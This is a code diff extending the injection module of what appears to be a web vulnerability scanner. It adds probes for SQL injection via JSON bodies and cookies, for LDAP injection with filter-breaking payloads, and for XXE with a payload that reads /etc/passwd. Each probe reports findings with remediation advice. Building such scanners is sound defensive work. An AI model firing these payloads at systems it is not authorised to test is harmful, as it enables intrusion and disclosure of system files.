@@ -404,6 +404,17 @@ async def run(ctx) -> None:
     # Header-based SQLi
     await _probe_header_sqli(ctx, base)
 
+    # Cookie-based SQLi
+    await _probe_cookie_sqli(ctx, base)
+
+    # LDAP injection (on search/filter params)
+    ldap_params = ["search", "filter", "query", "q", "name", "user"]
+    ldap_tasks = [_probe_ldap(ctx, base, param) for param in ldap_params if param in PARAMS]
+    await asyncio.gather(*ldap_tasks, return_exceptions=True)
+
+    # XML/XXE injection
+    await _probe_xml(ctx, base)
+
     tasks = [_probe_param(ctx, base, param) for param in PARAMS]
     await asyncio.gather(*tasks, return_exceptions=True)
 
@@ -413,6 +424,8 @@ async def run(ctx) -> None:
     await asyncio.gather(*nosql_tasks, return_exceptions=True)
 
     # Second-order SQLi: store payload in one param, check if it executes in another
+    await _probe_json_body(ctx, base)
+
     await _probe_second_order(ctx, base)
 
 
@@ -450,3 +463,134 @@ async def _probe_second_order(ctx, base: str) -> None:
                     tags=["sqli", "injection", "second-order"],
                 ))
                 return
+
+async def _probe_json_body(ctx, base):
+    json_endpoints = ["/api/login", "/api/search", "/api/query", "/api/data", "/search", "/query"]
+    for endpoint in json_endpoints:
+        if not ctx.can_request():
+            return
+        for payload in ERROR_PAYLOADS[:3]:
+            if not ctx.can_request():
+                return
+            ctx.increment()
+            baseline_resp = await ctx.http.post(
+                base + endpoint,
+                json={"query": "test", "search": "test", "id": "1"},
+                timeout=ctx.settings.timeout,
+            )
+            baseline_body = (baseline_resp.text or "").lower()
+            if not ctx.can_request():
+                return
+            ctx.increment()
+            resp = await ctx.http.post(
+                base + endpoint,
+                json={"query": payload, "search": payload, "id": payload},
+                timeout=ctx.settings.timeout,
+            )
+            body = (resp.text or "").lower()
+            new_errors = [sig for sig in ERROR_SIGNATURES if sig in body and sig not in baseline_body]
+            if new_errors:
+                safe_id = endpoint.strip("/").replace("/", "-")
+                ctx.add_finding(Finding(
+                    id="sqli-json-" + safe_id,
+                    title="Potential SQL injection via JSON body on " + endpoint,
+                    severity=Severity.HIGH,
+                    confidence=0.8,
+                    asset=base + endpoint,
+                    module="injection",
+                    description="SQL error signature (" + new_errors[0] + ") detected in JSON response.",
+                    remediation="Use parameterized queries. Validate JSON input.",
+                    tags=["sqli", "injection", "json"],
+                ))
+                return
+
+LDAP_PAYLOADS = ["*", ")(uid=*)", "admin*", ")(cn=*)", "*) (|(uid=*", "admin)(|(password=*)"]
+
+async def _probe_ldap(ctx, base, param):
+    found = False
+    for payload in LDAP_PAYLOADS:
+        if not ctx.can_request():
+            return found
+        ctx.increment()
+        baseline_resp = await ctx.http.get(base, params={param: "test"}, timeout=ctx.settings.timeout)
+        baseline_body = (baseline_resp.text or "").lower()
+        if not ctx.can_request():
+            return found
+        ctx.increment()
+        resp = await ctx.http.get(base, params={param: payload}, timeout=ctx.settings.timeout)
+        body = (resp.text or "").lower()
+        ldap_errors = ["ldap", "invalid dn", "search filter", "ldap_search", "ldap_bind"]
+        new_errors = [sig for sig in ldap_errors if sig in body and sig not in baseline_body]
+        if new_errors:
+            ctx.add_finding(Finding(
+                id="ldap-injection-" + param,
+                title="Potential LDAP injection via " + param,
+                severity=Severity.HIGH,
+                confidence=0.7,
+                asset=base + "?" + param + "=" + payload,
+                module="injection",
+                description="LDAP error signature detected in response.",
+                remediation="Use parameterized LDAP queries and input validation.",
+                tags=["ldap", "injection"],
+            ))
+            found = True
+            break
+    return found
+
+XML_PAYLOADS = ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', '<?xml version="1.0"?><foo>test</foo>']
+
+async def _probe_xml(ctx, base):
+    xml_endpoints = ["/api/xml", "/api/soap", "/xml", "/soap", "/ws"]
+    for endpoint in xml_endpoints:
+        if not ctx.can_request():
+            return
+        for payload in XML_PAYLOADS:
+            if not ctx.can_request():
+                return
+            ctx.increment()
+            resp = await ctx.http.post(
+                base + endpoint,
+                data=payload,
+                headers={"Content-Type": "application/xml"},
+                timeout=ctx.settings.timeout,
+            )
+            body = (resp.text or "").lower()
+            if "root:x:" in body or "daemon:" in body:
+                ctx.add_finding(Finding(
+                    id="xxe-" + endpoint.strip("/").replace("/", "-"),
+                    title="Potential XXE via " + endpoint,
+                    severity=Severity.CRITICAL,
+                    confidence=0.9,
+                    asset=base + endpoint,
+                    module="injection",
+                    description="XML external entity injection detected.",
+                    remediation="Disable external entity processing in XML parser.",
+                    tags=["xxe", "injection", "xml"],
+                ))
+                return
+async def _probe_cookie_sqli(ctx, base):
+    for payload in ERROR_PAYLOADS[:3]:
+        if not ctx.can_request():
+            return
+        ctx.increment()
+        baseline_resp = await ctx.http.get(base, timeout=ctx.settings.timeout)
+        baseline_body = (baseline_resp.text or '').lower()
+        if not ctx.can_request():
+            return
+        ctx.increment()
+        resp = await ctx.http.get(base, headers={'Cookie': 'session=' + payload}, timeout=ctx.settings.timeout)
+        body = (resp.text or '').lower()
+        new_errors = [sig for sig in ERROR_SIGNATURES if sig in body and sig not in baseline_body]
+        if new_errors:
+            ctx.add_finding(Finding(
+                id='sqli-cookie',
+                title='Potential SQL injection via Cookie header',
+                severity=Severity.HIGH,
+                confidence=0.75,
+                asset=base,
+                module='injection',
+                description=f'SQL error signature ({new_errors[0]}) detected via Cookie injection.',
+                remediation='Use parameterized queries. Do not interpolate cookies into SQL.',
+                tags=['sqli', 'injection', 'cookie-based'],
+            ))
+            return
